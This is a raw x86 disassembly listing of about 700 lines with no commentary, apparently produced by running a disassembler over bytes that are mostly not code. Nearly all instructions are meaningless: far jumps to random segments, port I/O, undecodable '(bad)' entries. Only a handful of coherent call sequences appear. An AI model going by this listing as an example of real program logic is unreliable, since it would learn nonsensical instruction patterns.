  407a14:	xor    ebp,DWORD PTR [eax+ecx*4-0x40a22290]
  407a1b:	jmp    0x79a2676
  407a20:	adc    esi,DWORD PTR [ecx+0x6c]
  407a23:	dec    esp
  407a24:	int    0x48
  407a26:	inc    ecx
  407a27:	js     0x4079fd
  407a29:	mov    ecx,0x8f4c6fed
  407a2e:	ins    BYTE PTR es:[edi],dx
  407a2f:	xchg   esp,eax
  407a30:	cmp    dl,BYTE PTR [edx]
  407a32:	xchg   esi,eax
  407a33:	je     0x407a22
  407a35:	inc    ebx
  407a36:	out    dx,al
  407a37:	xchg   ecx,eax
  407a38:	cld    
  407a39:	lock out 0x8f,eax
  407a3c:	clc    
  407a3d:	ins    DWORD PTR es:[edi],dx
  407a3e:	dec    ebx
  407a3f:	pop    eax
  407a40:	out    0xfc,eax
  407a42:	outs   dx,BYTE PTR ds:[esi]
  407a43:	jl     0x407aa1
  407a45:	add    edi,0x90e67347
  407a4b:	or     al,0x80
  407a4d:	add    BYTE PTR ds:0xb9e4dc1f,dh
  407a53:	outs   dx,BYTE PTR ds:[esi]
  407a54:	jns    0x407ab7
  407a56:	rol    DWORD PTR es:[edi+esi*1],cl
  407a5a:	out    0xed,al
  407a5c:	daa    
  407a5d:	jl     0x407ab9
  407a5f:	lods   eax,DWORD PTR ds:[esi]
  407a60:	call   0x9306:0xfb247863
  407a67:	mov    eax,ds:0x950929f5
  407a6c:	jg     0x407a83
  407a6e:	(bad)  
  407a6f:	cmp    al,0xf
  407a71:	stos   BYTE PTR es:[edi],al
  407a72:	loope  0x407a7d
  407a74:	lea    esi,ds:0x71ac6b8
  407a7a:	icebp  
  407a7b:	adc    ah,BYTE PTR [ebx+0x23]
  407a7e:	mov    sp,WORD PTR [ebx-0x6b]
  407a82:	dec    esi
  407a83:	mov    ebp,eax
  407a85:	aam    0x56
  407a87:	or     DWORD PTR [edx],esp
  407a89:	and    DWORD PTR [ebp-0xc349b14],0xfffffffb
  407a90:	mov    eax,0xb89e5cb9
  407a95:	xchg   edx,eax
  407a96:	ss in  eax,0x8a
  407a99:	cs retf 0x3c2d
  407a9d:	jnp    0x407a8d
  407a9f:	xchg   esi,eax
  407aa0:	or     edx,ebp
  407aa2:	fs stc 
  407aa4:	mov    ecx,0xd8f38997
  407aa9:	mov    ebp,0x5c9e0ace
  407aae:	cwde   
  407aaf:	int    0x34
  407ab1:	ins    DWORD PTR es:[edi],dx
  407ab2:	fisub  DWORD PTR [ebx+0x18a6a228]
  407ab8:	imul   ecx,DWORD PTR [edi+ebp*4+0x61],0x4716ed38
  407ac0:	dec    edi
  407ac1:	popa   
  407ac2:	jp     0x407a9d
  407ac4:	ds push ebx
  407ac6:	or     esp,esp
  407ac8:	sub    cl,BYTE PTR [edx-0x57060d6a]
  407ace:	jl     0x407aaa
  407ad0:	mov    bl,0x3e
  407ad2:	pop    ds
  407ad3:	adc    DWORD PTR [esi],ecx
  407ad5:	add    al,0x70
  407ad7:	xchg   edx,eax
  407ad8:	pop    eax
  407ad9:	lods   al,BYTE PTR ds:[esi]
  407ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407adb:	int3   
  407adc:	xor    al,0x8a
  407ade:	pop    ss
  407adf:	test   BYTE PTR [edx],cl
  407ae1:	(bad)  
  407ae3:	or     dh,dl
  407ae5:	mov    al,ds:0x6a5ee494
  407aea:	mov    eax,0x64ef37c6
  407aef:	dec    edx
  407af0:	or     BYTE PTR [ebx+edi*4],ch
  407af3:	stc    
  407af4:	retf   0x892f
  407af7:	fild   WORD PTR [ebx+edx*1-0x3bcec126]
  407afe:	icebp  
  407aff:	loope  0x407a95
  407b01:	jmp    0x5158:0x2342ebed
  407b08:	mov    edi,0x5906db23
  407b0d:	jge    0x407ab4
  407b0f:	in     eax,0x9c
  407b11:	dec    edx
  407b12:	inc    esp
  407b13:	dec    eax
  407b14:	fnstenv [ebx]
  407b16:	mov    BYTE PTR [ebx],0xc7
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	sbb    al,0xd1
  407b41:	add    eax,0x70c9575a
  407b46:	jo     0x407b68
  407b48:	jge    0x407bba
  407b4a:	jo     0x407b25
  407b4c:	scas   al,BYTE PTR es:[edi]
  407b4d:	or     eax,0x6de4a422
  407b52:	cmp    cl,BYTE PTR [ebp+0x42]
  407b55:	push   ebp
  407b56:	sub    al,0xd3
  407b58:	and    DWORD PTR [edi-0x6c6adb47],ebp
  407b5e:	outs   dx,DWORD PTR ds:[esi]
  407b5f:	les    esi,FWORD PTR [edx+0xd97c4e0]
  407b65:	lock cmp edx,esi
  407b68:	xchg   ebp,eax
  407b69:	add    cl,BYTE PTR [edi+eax*4+0x25]
  407b6d:	inc    eax
  407b6e:	xchg   BYTE PTR [edx],bh
  407b70:	loope  0x407b5b
  407b72:	dec    esi
  407b73:	mov    ds:0xda58ecb3,eax
  407b78:	cli    
  407b79:	xchg   ecx,eax
  407b7a:	mov    edi,0x7e53356f
  407b7f:	fstp   QWORD PTR [esi+0x3f]
  407b82:	(bad)  
  407b83:	into   
  407b84:	sar    DWORD PTR [ebx+0x29],1
  407b87:	leave  
  407b88:	clc    
  407b89:	xchg   ebx,eax
  407b8a:	fnstsw WORD PTR [esi]
  407b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b8d:	dec    esi
  407b8e:	cwde   
  407b8f:	adc    BYTE PTR [ebx+0x33f75976],0xd4
  407b96:	stos   DWORD PTR es:[edi],eax
  407b97:	stos   BYTE PTR es:[edi],al
  407b98:	das    
  407b99:	(bad)  
  407b9a:	pop    ds
  407b9b:	jo     0x407b3d
  407b9d:	pop    edx
  407b9e:	loop   0x407c19
  407ba0:	repz out dx,eax
  407ba2:	cmp    ecx,eax
  407ba4:	mov    ds:0x6cb44444,al
  407ba9:	js     0x407c08
  407bab:	ret    0x6fca
  407bae:	xchg   esp,eax
  407baf:	pop    eax
  407bb0:	mov    eax,0x35ebf185
  407bb5:	mov    edx,0xd9b51d43
  407bba:	jp     0x407b6b
  407bbc:	sbb    eax,0x85e96eb7
  407bc1:	arpl   WORD PTR ds:[ecx+edx*1],cx
  407bc5:	mov    edi,0x66413162
  407bca:	sub    al,0xa3
  407bcc:	jno    0x407ba8
  407bce:	lahf   
  407bcf:	jnp    0x407c4f
  407bd1:	in     al,dx
  407bd2:	sub    al,0xd6
  407bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd5:	scas   eax,DWORD PTR es:[edi]
  407bd6:	rcl    DWORD PTR ds:0xdc3e39fe,cl
  407bdc:	push   ss
  407bdd:	fadd   st,st(4)
  407bdf:	addr16 adc ebx,ebx
  407be2:	lods   al,BYTE PTR ds:[esi]
  407be3:	scas   eax,DWORD PTR es:[edi]
  407be4:	(bad)  
  407be5:	sahf   
  407be6:	push   ebp
  407be7:	popa   
  407be8:	lods   eax,DWORD PTR ds:[esi]
  407be9:	mov    DWORD PTR [eax+0x1c4f2a5],esi
  407bef:	push   ds
  407bf0:	push   ds
  407bf1:	mov    ds:0xfaec9c39,al
  407bf6:	data16 or ch,BYTE PTR [ecx]
  407bf9:	jle    0x407b84
  407bfb:	outs   dx,DWORD PTR ds:[esi]
  407bfc:	mov    al,ds:0x644843e6
  407c01:	stc    
  407c02:	call   0xa6eb:0x6ed42dca
  407c09:	jno    0x407bcc
  407c0b:	mov    ecx,0x48c98591
  407c10:	inc    edx
  407c11:	ret    0xbfbd
  407c14:	mov    ecx,0x20d2c29e
  407c19:	loop   0x407c27
  407c1b:	add    al,0x1c
  407c1d:	mov    esi,DWORD PTR [esi+0x11]
  407c20:	(bad)  
  407c21:	aad    0x6b
  407c23:	mov    bh,0x5e
  407c25:	mov    ah,0x7f
  407c27:	mov    ebx,0x8bc5f88c
  407c2c:	mov    dl,0xa7
  407c2e:	mov    gs,WORD PTR [ecx+0x2c]
  407c31:	out    dx,al
  407c32:	or     bl,al
  407c34:	popa   
  407c35:	stos   DWORD PTR es:[edi],eax
  407c36:	lods   eax,DWORD PTR ds:[esi]
  407c37:	jbe    0x407cae
  407c39:	add    eax,0xb5c3a38a
  407c3e:	lahf   
  407c3f:	neg    dl
  407c41:	je     0x407c90
  407c43:	ds push ebp
  407c45:	outs   dx,BYTE PTR ds:[esi]
  407c46:	sub    DWORD PTR [ebx],edi
  407c48:	inc    ebx
  407c49:	shr    DWORD PTR [edx],1
  407c4b:	push   eax
  407c4c:	or     eax,0x3856e18f
  407c51:	or     dh,BYTE PTR [edx]
  407c53:	push   esi
  407c54:	hlt    
  407c55:	iret   
  407c56:	cdq    
  407c57:	jmp    0xae5a:0x6a533625
  407c5e:	hlt    
  407c5f:	out    dx,al
  407c60:	fidivr WORD PTR [ecx]
  407c62:	call   0xa9174784
  407c67:	sbb    esp,ebx
  407c69:	push   ss
  407c6a:	dec    edx
  407c6b:	push   edi
  407c6c:	clc    
  407c6d:	into   
  407c6e:	popa   
  407c6f:	sbb    eax,0x9a03946
  407c74:	ror    BYTE PTR [ebx+0x45c4f6e3],1
  407c7a:	xchg   ebx,eax
  407c7b:	retf   0x394c
  407c7e:	mov    bl,dl
  407c80:	test   eax,0x7d7f41a5
  407c85:	fst    QWORD PTR [edi+0x6f338e46]
  407c8b:	mov    eax,ds:0x75833ec0
  407c90:	cmp    ch,BYTE PTR [ebp+0x23]
  407c93:	loop   0x407c79
  407c95:	xor    dl,BYTE PTR [edx-0x1b8f9851]
  407c9b:	and    ch,dl
  407c9d:	pop    eax
  407c9e:	loopne 0x407cde
  407ca0:	mov    ebx,0xfd6b0cfc
  407ca5:	push   esi
  407ca6:	ficomp DWORD PTR [edi+0x3c]
  407ca9:	popa   
  407caa:	jo     0x407c83
  407cac:	jbe    0x407cc9
  407cae:	lds    ebx,FWORD PTR [ecx+0x75]
  407cb1:	or     dh,ah
  407cb3:	push   ebx
  407cb4:	ret    0xd276
  407cb7:	rcr    DWORD PTR [ebp+0x6f],0xd3
  407cbb:	pop    ds
  407cbc:	pop    esi
  407cbd:	mov    eax,ds:0x21a386d3
  407cc2:	repnz jmp 0x6085:0x94ab636
  407cca:	cmp    eax,0xddb54372
  407ccf:	xchg   esi,eax
  407cd0:	cdq    
  407cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd2:	push   ebp
  407cd3:	jle    0x407c6c
  407cd5:	xor    al,0x7b
  407cd7:	test   DWORD PTR [esi+0x44],0x4c54dfbc
  407cde:	test   DWORD PTR [ebp-0x36],ecx
  407ce1:	adc    DWORD PTR [edi-0x4a291028],0xffffffb7
  407ce8:	addr16 jo 0x407ce4
  407ceb:	in     al,dx
  407cec:	jecxz  0x407d2d
  407cee:	sub    BYTE PTR [ecx+0x19],cl
  407cf1:	shl    DWORD PTR [ebx+edi*2+0x1b78d944],cl
  407cf8:	pop    edi
  407cf9:	jae    0x407ce2
  407cfb:	fst    DWORD PTR [ecx+0x47]
  407cfe:	jl     0x407cea
  407d00:	push   edx
  407d01:	pop    es
  407d02:	retf   
  407d03:	sar    ebx,0x7a
  407d06:	xchg   edi,eax
  407d07:	outs   dx,BYTE PTR ds:[esi]
  407d08:	xchg   ebp,eax
  407d09:	mov    ecx,edx
  407d0b:	add    BYTE PTR [edx-0x7],ch
  407d0e:	jae    0x407d3a
  407d10:	cdq    
  407d11:	sbb    BYTE PTR [esi-0x28],0x13
  407d15:	add    BYTE PTR [ecx+0x9],bl
  407d18:	adc    al,0x9a
  407d1a:	std    
  407d1b:	pop    ebp
  407d1c:	pop    ss
  407d1d:	mov    dh,BYTE PTR [ebx]
  407d1f:	sbb    eax,0x602e7a7
  407d24:	xchg   edx,eax
  407d25:	gs mov BYTE PTR cs:[eax],dh
  407d29:	jp     0x407d7f
  407d2b:	ds mov bh,0x32
  407d2e:	cmp    eax,0x1847e2fc
  407d33:	mov    ah,0xb1
  407d35:	std    
  407d36:	mov    bh,0xa8
  407d38:	and    BYTE PTR [esi+0x6bfd7177],bh
  407d3e:	xor    ebx,DWORD PTR [ebp+0x16]
  407d41:	xchg   esi,eax
  407d42:	je     0x407d6d
  407d44:	push   cs
  407d45:	in     al,0x95
  407d47:	push   eax
  407d48:	cmc    
  407d49:	shl    esi,1
  407d4b:	shr    BYTE PTR [ebx+0x67],cl
  407d4e:	xor    edx,DWORD PTR [ecx]
  407d50:	and    DWORD PTR [ebx+0x1529bb1],ebx
  407d56:	pusha  
  407d57:	mov    esp,0x57e2a22b
  407d5c:	(bad)  
  407d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d5e:	adc    DWORD PTR ds:0x6b599e8,ebx
  407d64:	ins    BYTE PTR es:[edi],dx
  407d65:	pop    es
  407d66:	xor    eax,DWORD PTR [ebx-0xd]
  407d69:	retf   
  407d6a:	(bad)  
  407d6c:	push   0x4f
  407d6e:	jb     0x407dd0
  407d70:	mov    dh,0x80
  407d72:	aam    0x28
  407d74:	cli    
  407d75:	sbb    eax,0x6fa5d3cc
  407d7a:	repz sbb edx,DWORD PTR [ebp+0xd]
  407d7e:	call   0x9e22505e
  407d83:	mov    edi,0xf46fad59
  407d88:	push   0xfffffff9
  407d8a:	(bad)  
  407d8d:	mov    dh,0x3e
  407d8f:	lahf   
  407d90:	loopne 0x407d41
  407d92:	mov    bh,0x54
  407d94:	pop    ss
  407d95:	fsubr  st,st(3)
  407d97:	pop    edi
  407d98:	test   al,0x78
  407d9a:	mov    al,0xaf
  407d9c:	push   esp
  407d9d:	or     eax,0x3d65f343
  407da2:	shr    ah,0x57
  407da5:	or     BYTE PTR [ebx+eiz*4],ch
  407da8:	ret    
  407da9:	scas   al,BYTE PTR es:[edi]
  407daa:	inc    eax
  407dab:	in     al,0x79
  407dad:	ja     0x407df7
  407daf:	pop    ecx
  407db0:	fcomi  st,st(0)
  407db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db3:	ret    
  407db4:	fs push ebx
  407db6:	mov    DWORD PTR [ecx],esp
  407db8:	mov    al,ds:0xb3bba97c
  407dbd:	loop   0x407d40
  407dbf:	pop    es
  407dc0:	mov    eax,ds:0x9cdd4687
  407dc5:	mov    ebp,0xf7934266
  407dca:	xchg   edx,ecx
  407dcc:	inc    ebp
  407dcd:	es cwde 
  407dcf:	mov    esp,0x2327bc03
  407dd4:	and    DWORD PTR [edx+0x610fbbe7],ebx
  407dda:	xor    ecx,DWORD PTR [eax+0x191f9168]
  407de0:	int    0xb4
  407de2:	sbb    BYTE PTR [esi+0xd],ch
  407de5:	data16 into 
  407de7:	nop
  407de8:	in     al,0x84
  407dea:	mov    edx,0x91ed427b
  407def:	ins    DWORD PTR es:[edi],dx
  407df0:	sbb    esi,edi
  407df2:	add    edi,DWORD PTR [ebp+ebx*8-0x7e]
  407df6:	lock fs push edx
  407df9:	mov    ?,WORD PTR [ebp+eiz*8+0x788de527]
  407e00:	dec    edx
  407e01:	add    bl,bl
  407e03:	test   ah,ah
  407e05:	jl     0x407dfd
  407e07:	icebp  
  407e08:	xor    ecx,DWORD PTR [ebx-0x1e82c232]
  407e0e:	jbe    0x407da6
  407e10:	lea    edx,[edx]
  407e12:	cmc    
  407e13:	push   es
  407e14:	adc    BYTE PTR [ecx],cl
  407e16:	pop    ds
  407e17:	cmp    edi,ebp
  407e19:	fnstsw WORD PTR [edi]
  407e1b:	loop   0x407e70
  407e1d:	sti    
  407e1e:	pop    ebx
  407e1f:	xor    eax,0xf869b8c7
  407e24:	(bad)  
  407e25:	pusha  
  407e26:	pop    ss
  407e27:	sub    DWORD PTR [ecx+0x11],esp
  407e2a:	mov    dh,0xd0
  407e2c:	jecxz  0x407eac
  407e2e:	xor    dh,dh
  407e30:	mov    eax,ds:0x66acc616
  407e35:	mov    ah,0x3d
  407e37:	out    dx,al
  407e38:	jbe    0x407dfa
  407e3a:	loop   0x407e55
  407e3c:	adc    eax,0x57f5c78
  407e41:	add    eax,0xa74f50ac
  407e46:	stc    
  407e47:	xor    eax,0x4a11950c
  407e4c:	pop    ss
  407e4d:	jmp    0x407e79
  407e4f:	push   0xfffffff5
  407e51:	inc    ecx
  407e52:	sub    esp,DWORD PTR [ebx]
  407e54:	or     edx,DWORD PTR cs:[ecx-0x32]
  407e58:	mov    ebx,0xe6bd268f
  407e5d:	cdq    
  407e5e:	cmp    eax,0xf4101e61
  407e63:	cmp    eax,0x20aa60ea
  407e68:	mov    edx,0x6b9872c7
  407e6d:	adc    DWORD PTR [eax-0x7e191756],0xae88783f
  407e77:	out    0x1f,eax
  407e79:	jle    0x407e31
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	xor    ecx,DWORD PTR [esi+ebx*1+0x70d507eb]
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407e59
  407ea5:	mov    esp,0x28d9a25
  407eaa:	xchg   edi,eax
  407eab:	xor    dh,bh
  407ead:	clc    
  407eae:	and    eax,0x2547d250
  407eb3:	das    
  407eb4:	xchg   BYTE PTR [esi+eiz*4],dh
  407eb7:	xchg   ecx,eax
  407eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb9:	and    DWORD PTR [edi],edx
  407ebb:	das    
  407ebc:	adc    eax,0x8ea260aa
  407ec1:	imul   ebx,DWORD PTR [ecx+ebx*8-0x59dc696a],0x51
  407ec9:	stos   BYTE PTR es:[edi],al
  407eca:	mov    ebx,0xf3d867a5
  407ecf:	jb     0x407f37
  407ed1:	pop    esi
  407ed2:	test   al,0x88
  407ed4:	and    al,BYTE PTR [ebx+0x1f4ce183]
  407eda:	inc    eax
  407edb:	cli    
  407edc:	xchg   esi,eax
  407edd:	or     al,0xa8
  407edf:	dec    ebp
  407ee0:	mov    dl,0x2b
  407ee2:	sub    DWORD PTR [esi+ebx*1-0x2ef1e2f3],esi
  407ee9:	push   ebx
  407eea:	sahf   
  407eeb:	add    eax,0xe852bd75
  407ef0:	xchg   esi,eax
  407ef1:	inc    ebp
  407ef2:	(bad)  
  407ef3:	adc    al,0xa9
  407ef5:	inc    ebx
  407ef6:	jecxz  0x407eef
  407ef8:	mov    bl,0x59
  407efa:	inc    esp
  407efb:	pop    ds
  407efc:	test   al,0x2c
  407efe:	jo     0x407e8b
  407f00:	push   ecx
  407f01:	adc    BYTE PTR [ecx],0x6f
  407f04:	pop    esp
  407f05:	cdq    
  407f06:	push   edi
  407f07:	test   eax,0xd4823711
  407f0c:	imul   edx,DWORD PTR [edx-0x3c6d8b59],0xd352c9f
  407f16:	das    
  407f17:	mov    ch,0x64
  407f19:	ins    BYTE PTR es:[edi],dx
  407f1a:	repz out dx,al
  407f1c:	dec    edi
  407f1d:	clc    
  407f1e:	(bad)  
  407f1f:	popa   
  407f20:	sub    BYTE PTR [edx],ch
  407f22:	jns    0x407f10
  407f24:	push   edx
  407f25:	sbb    BYTE PTR [ebp*4-0x47f4075a],ch
  407f2c:	sbb    eax,0xd68710b1
  407f31:	js     0x407f46
  407f33:	ja     0x407f31
  407f35:	icebp  
  407f36:	inc    ebp
  407f37:	sbb    DWORD PTR [ebx+0x6811d2d1],ebp
  407f3d:	sub    ebp,ebx
  407f3f:	(bad)  [eax+0x1]
  407f42:	repnz stc 
  407f44:	sbb    al,0xd3
  407f46:	int    0xf5
  407f48:	adc    WORD PTR [edx+0x2d7d7646],ax
  407f4f:	stos   BYTE PTR es:[edi],al
  407f50:	adc    al,0x6e
  407f52:	push   cs
  407f53:	bound  eax,QWORD PTR [edx]
  407f55:	jmp    0x20df22c7
  407f5a:	xchg   esp,edi
  407f5c:	not    ch
  407f5e:	xchg   ebx,eax
  407f5f:	sahf   
  407f60:	ins    BYTE PTR es:[edi],dx
  407f61:	clc    
  407f62:	(bad)  ds:0x2a1b67a1
  407f68:	push   ebp
  407f69:	or     eax,0x1e36cbe6
  407f6e:	inc    edi
  407f6f:	icebp  
  407f70:	pop    es
  407f71:	mov    bl,0xfb
  407f73:	(bad)  
  407f74:	ss jnp 0x407fb9
  407f77:	inc    ecx
  407f78:	lahf   
  407f79:	pop    edx
  407f7a:	(bad)  
  407f7b:	cmp    BYTE PTR [edi-0x47],cl
  407f7e:	xor    al,BYTE PTR [ebp+0x37]
  407f81:	mov    ecx,0x44d4af8c
  407f86:	sbb    DWORD PTR [ecx+0x4b6809fc],ebx
  407f8c:	sub    eax,0xea61afae
  407f91:	int3   
  407f92:	or     eax,0x67ad7741
  407f97:	xchg   ebx,eax
  407f98:	fldcw  WORD PTR [eax-0x2df22dff]
  407f9e:	ins    DWORD PTR es:[edi],dx
  407f9f:	imul   esi,DWORD PTR [esi+0x438c7050],0x4c9a2cb7
  407fa9:	or     eax,0x941afd00
  407fae:	push   0xffffff94
  407fb0:	inc    esp
  407fb1:	xor    BYTE PTR [ecx],0x35
  407fb4:	mov    bh,0xb6
  407fb6:	dec    edi
  407fb7:	data16 jp 0x407ffa
  407fba:	xchg   edx,eax
  407fbb:	repnz pop ebp
  407fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fbe:	mov    cl,cl
  407fc0:	shl    DWORD PTR [esi+0x7b],1
  407fc3:	cmp    al,0x5b
  407fc5:	lock call 0x4b02:0x8c3800d3
  407fcd:	ret    
  407fce:	inc    esi
  407fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd0:	cs mov eax,0x740b98ba
  407fd6:	mov    ds:0x65c0652b,al
  407fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fdc:	mov    eax,ds:0xc59c367d
  407fe1:	int3   
  407fe2:	aas    
  407fe3:	jg     0x408058
  407fe5:	pop    edi
  407fe6:	push   es
  407fe7:	test   al,0x23
  407fe9:	pop    esp
  407fea:	leave  
  407feb:	push   ds
  407fec:	sub    DWORD PTR [edi-0x4],edx
  407fef:	lods   eax,DWORD PTR ds:[esi]
  407ff0:	pop    eax
  407ff1:	cli    
  407ff2:	ret    
  407ff3:	dec    ecx
  407ff4:	mov    ah,BYTE PTR [edx]
  407ff6:	scas   al,BYTE PTR es:[edi]
  407ff7:	sbb    cl,dl
  407ff9:	lahf   
  407ffa:	pop    esi
  407ffb:	sub    eax,0x6cda3c83
  408000:	retf   0xcc4c
  408003:	enter  0x1281,0x4d
  408007:	and    ebx,ecx
  408009:	inc    eax
  40800a:	ja     0x40803c
  40800c:	cmp    al,0x1b
  40800e:	and    DWORD PTR [ecx-0xe],edi
  408011:	call   0x757c84e0
  408016:	mov    edx,0xa1c9eb6d
  40801b:	mov    edi,0xb1f8cd1d
  408020:	pop    ebx
  408021:	lods   al,BYTE PTR ds:[esi]
  408022:	(bad)  
  408023:	loopne 0x407ff0
  408025:	mov    ds:0x61989be6,al
  40802a:	cmp    al,0x84
  40802c:	out    0xf6,eax
  40802e:	out    0xa8,al
  408030:	pop    ebp
  408031:	daa    
  408032:	sbb    al,0x3
  408034:	jl     0x407fe8
  408036:	and    al,0x7a
  408038:	xor    al,BYTE PTR [esi]
  40803a:	add    dl,BYTE PTR [ecx]
  40803c:	les    edi,FWORD PTR [edi-0x5516b34f]
  408042:	dec    edi
  408043:	mov    al,ds:0x2e3c9354
  408048:	ins    BYTE PTR es:[edi],dx
  408049:	jo     0x40806f
  40804b:	out    0x2a,eax
  40804d:	fild   QWORD PTR [eax]
  40804f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408051:	xchg   edi,eax
  408052:	bound  esp,QWORD PTR [eax+0x6a]
  408055:	mov    esp,DWORD PTR [edx+esi*1+0x6978ccc9]
  40805c:	and    eax,DWORD PTR [ecx-0x50]
  40805f:	call   0xc4cfaa02
  408064:	inc    ecx
  408065:	mov    BYTE PTR [eax],bh
  408067:	push   edi
  408068:	push   edx
  408069:	je     0x4080ae
  40806b:	and    DWORD PTR [ecx],esi
  40806d:	lahf   
  40806e:	popa   
  40806f:	pop    es
  408070:	fiadd  WORD PTR [ebx-0x7a]
  408073:	mov    eax,ds:0x8d1b0e0e
  408078:	push   ebx
  408079:	popa   
  40807a:	(bad)  
  40807c:	mov    cl,0x5d
  40807e:	sahf   
  40807f:	test   eax,0xbf594853
  408084:	add    eax,0xa772f4ba
  408089:	jmp    0x61b0649f
  40808e:	or     ch,BYTE PTR [ebx-0x7b]
  408091:	mov    cx,0x537a
  408095:	pop    ds
  408096:	adc    al,0xd1
  408098:	enter  0x7d40,0xcd
  40809c:	in     eax,0x5
  40809e:	arpl   WORD PTR [ebx+0x80478c1],cx
  4080a4:	es sahf 
  4080a6:	mov    ah,0x7a
  4080a8:	adc    edx,ebx
  4080aa:	(bad)  
  4080ab:	push   edi
  4080ac:	sbb    DWORD PTR [ebp-0x11922b33],edi
  4080b2:	sbb    edx,DWORD PTR [edi+0x0]
  4080b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080b6:	in     eax,dx
  4080b7:	(bad)  
  4080b8:	aad    0xde
  4080ba:	jp     0x4080a4
  4080bc:	push   ebp
  4080bd:	mov    ?,WORD PTR [eax]
  4080bf:	jge    0x4080e5
  4080c1:	daa    
  4080c2:	and    BYTE PTR [ebx-0x144048ea],ah
  4080c8:	ret    0x99fd
  4080cb:	loopne 0x4080d3
  4080cd:	pop    ss
  4080ce:	add    al,0xa6
  4080d0:	mov    bl,0xbc
  4080d2:	cli    
  4080d3:	leave  
  4080d4:	xchg   esp,eax
  4080d5:	dec    edx
  4080d6:	jae    0x408141
  4080d8:	es pushf 
  4080da:	adc    ah,BYTE PTR [edi-0x7c]
  4080dd:	loopne 0x40811b
  4080df:	xlat   BYTE PTR ds:[ebx]
  4080e0:	xor    BYTE PTR [eax+0xa],ah
  4080e3:	mov    esp,0xd40c52a9
  4080e8:	fisttp QWORD PTR [ecx]
  4080ea:	mov    edi,0x8abf483d
  4080ef:	(bad)  
  4080f0:	loope  0x4080de
  4080f2:	push   esp
  4080f3:	shl    DWORD PTR [edi+0x40],0x44
  4080f7:	mov    ch,0xfd
  4080f9:	add    dh,dl
  4080fb:	and    dh,BYTE PTR [esi-0x2efe8173]
  408101:	xchg   BYTE PTR [edx+0x343f37fb],dh
  408107:	add    al,0x9e
  408109:	fwait
  40810a:	aad    0x1d
  40810c:	pusha  
  40810d:	dec    esp
  40810e:	jecxz  0x4080fd
  408110:	mov    esi,DWORD PTR [ebp+ebx*1+0x3d]
  408114:	push   eax
  408115:	(bad)  
  408116:	test   BYTE PTR [edi],0x7e
  408119:	std    
  40811a:	xor    dh,BYTE PTR [edx+0x75]
  40811d:	and    edx,DWORD PTR ds:0x915e86c0
  408123:	jl     0x408141
  408125:	mov    esp,0xeed2c9aa
  40812a:	setnp  BYTE PTR ds:0x7e0ba934
  408131:	xchg   ebp,eax
  408132:	adc    al,BYTE PTR [edi+0x773b4d0e]
  408138:	repnz dec edx
  40813a:	and    ecx,DWORD PTR [ebx+0x24]
  40813d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40813e:	sub    DWORD PTR ds:0x4b78e63d,ebx
  408144:	fs fadd st(6),st
  408147:	sti    
  408148:	scas   al,BYTE PTR es:[edi]
  408149:	(bad)
  40814d:	sar    BYTE PTR [edx-0x397b4150],cl
  408153:	lock shr DWORD PTR [esp+edi*2],cl
  408157:	in     al,dx
  408158:	sbb    BYTE PTR ds:0x3ea6bac7,bl
  40815e:	jo     0x40810d
  408160:	inc    DWORD PTR [edi]
  408162:	stos   BYTE PTR es:[edi],al
  408163:	hlt    
  408164:	sbb    al,0x1b
  408166:	out    0x8d,eax
  408168:	add    bh,BYTE PTR ds:0x8ea6f274
  40816e:	dec    eax
  40816f:	xor    al,0xa6
  408171:	mov    ds:0xafb6253d,al
  408176:	or     dl,BYTE PTR [edi+edi*8]
  408179:	mov    BYTE PTR [edx-0x26],bh
  40817c:	test   BYTE PTR ds:0xea142d09,ah
  408182:	mov    dh,0x13
  408184:	scas   eax,DWORD PTR es:[edi]
  408185:	call   0xf181:0x7ab495a2
  40818c:	pop    edx
  40818d:	(bad)  
  40818e:	std    
  40818f:	sbb    al,0x36
  408191:	mov    bh,0x40
  408193:	jmp    0xfa43840e
  408198:	std    
  408199:	pop    esi
  40819a:	aad    0x62
  40819c:	shl    BYTE PTR [eax-0x44],cl
  40819f:	xchg   ch,bl
  4081a1:	sub    edx,eax
  4081a3:	dec    ebp
  4081a4:	stc    
  4081a5:	mov    al,0xae
  4081a7:	(bad)  
  4081a9:	loop   0x4081ec
  4081ab:	out    0x7e,al
  4081ad:	and    al,0xd
  4081af:	inc    esp
  4081b0:	call   0x18c5:0x143f2f0f
  4081b7:	fsub   st(0),st
  4081b9:	rcl    BYTE PTR fs:[ebx],cl
  4081bc:	mov    al,0x6
  4081be:	add    eax,0xfe3367ac
  4081c3:	or     eax,ebx
  4081c5:	cmc    
